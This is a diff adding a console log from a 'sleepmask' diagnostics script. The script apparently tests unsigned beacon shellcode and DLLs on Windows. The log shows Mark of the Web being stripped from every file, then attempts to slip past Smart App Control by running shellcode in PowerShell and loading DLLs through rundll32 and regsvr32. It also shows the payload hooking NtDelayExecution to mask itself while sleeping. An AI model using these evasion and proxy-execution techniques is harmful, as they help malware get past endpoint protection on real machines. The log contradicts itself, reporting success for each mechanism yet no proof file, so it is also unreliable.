@@ -1,0 +1,109 @@
+C:\Users\natha\Documents\m-dev\native-test>.\diagnose.bat
+============================================================
+ sleepmask diagnostics v4
+ "Access is denied" (error 5) means Windows is BLOCKING
+ these unsigned, just-copied files. This unblocks EVERY
+ file (removes "Mark of the Web") and then fires the beacon
+ three ways (run-all.bat): powershell shellcode, rundll32,
+ regsvr32. The file sleepmask_beacon.txt is the proof.
+============================================================
+
+[1] Files + data streams (a Zone.Identifier stream = blocked):
+beacon.bin
+diagnose.bat
+inject_macos
+inject_win.exe
+payload.dll
+probe_windows.exe
+run-all.bat
+run-dll.bat
+RUN-ME.txt
+run-shell.ps1
+sleepmask.bin
+sleepmask_macho
+
+[2] Unblocking ALL files (removing Mark of the Web):
+  unblocked: beacon.bin
+  unblocked: diagnose.bat
+  unblocked: inject_macos
+  unblocked: inject_win.exe
+  unblocked: payload.dll
+  unblocked: probe_windows.exe
+  unblocked: run-all.bat
+  unblocked: run-dll.bat
+  unblocked: RUN-ME.txt
+  unblocked: run-shell.ps1
+  unblocked: sleepmask.bin
+  unblocked: sleepmask_macho
+
+[3] Streams after unblock:
+beacon.bin
+diagnose.bat
+inject_macos
+inject_win.exe
+payload.dll
+probe_windows.exe
+run-all.bat
+run-dll.bat
+RUN-ME.txt
+run-shell.ps1
+sleepmask.bin
+sleepmask_macho
+
+[4] The standalone .exe probes (may still be SAC-blocked):
+ ---- probe_windows.exe (expect a report, EXIT CODE 0)
+Access is denied.
+  probe EXIT CODE = 5
+
+ ---- inject_win.exe (expect two lines, EXIT CODE 42)
+Access is denied.
+  inject EXIT CODE = 5
+
+[5] The "runs no matter what" runners (3 mechanisms + proof):
+============================================================
+ sleepmask - the "runs no matter what" launcher
+ECHO is off.
+ Tries THREE independent mechanisms, in order. Any one that
+ fires is proof the payload ran. The file sleepmask_beacon.txt
+ is the UNIFIED proof: it sits on disk, so it cannot be the
+ "Access is denied" (error 5) that stops the .exe.
+ECHO is off.
+ [A] powershell shellcode  - SAC-PROOF, no disk image loaded
+ [B] rundll32              - unsigned DLL, mapped by signed tool
+ [C] regsvr32              - unsigned DLL, registered by signed tool
+============================================================
+
+[A] SAC-PROOF: powershell runs beacon.bin + sleepmask.bin as in-process shellcode
+------------------------------------------------------------
+sleepmask: coupled | windows x86-64 | host continues
+  [powershell] beacon (1520 B) returned cleanly (shellcode path OK)
+  [powershell] sleepmask payload (1333 B) returned in 250 ms
+  [powershell] sleepmask done_flag = 1  -> masked NtDelayExecution, slept, restored the original bytes
+  [powershell] forensic readback (field = value):
+    ntdll_base      = 00007FFFC6540000   (PEB walk resolved ntdll)
+    data_nr_delay   = 0000000000000034   (NtDelayExecution nr, from export prologue)
+    data_nr_protect = 0000000000000050   (NtProtectVirtualMemory nr)
+    saved_ntdelay   = 00007FFFC66A09F0   (original NtDelayExecution bytes @)
+    saved_ntprotect = 00007FFFC66A0D70   (original NtProtectVirtualMemory bytes @)
+    saved_old_prot  = 0000000000000040   (original protection; 0x20 = PAGE_EXECUTE_READ)
+    data_t0         = 01DD412C049781C8   (stub clock snapshot, 100ns since 1601)
+    delay_status    = 0000000000000000   (NTSTATUS of fallback NtDelayExecution)
+    prot_status     = 0000000000000000   (NTSTATUS of NtProtectVirtualMemory; 0x2B success = 0)
+    saved_bytes     = 4C 8B D1 B8 34 00 00 00 F6 04 25 08   (the 12 original thunk bytes)
+  powershell EXIT = 0
+
+[B] rundll32  (blocked if Smart App Control is in enforcement)
+------------------------------------------------------------
+  rundll32 EXIT = 0
+
+[C] regsvr32  (blocked if Smart App Control is in enforcement)
+------------------------------------------------------------
+  regsvr32 EXIT = 0
+
+============================================================
+[D] the unified proof - the file the beacon left on disk:
+  NOT FOUND - no mechanism fired. Run diagnose.bat.
+============================================================
+ Send this whole window back.
+============================================================
+Press any key to continue . . .
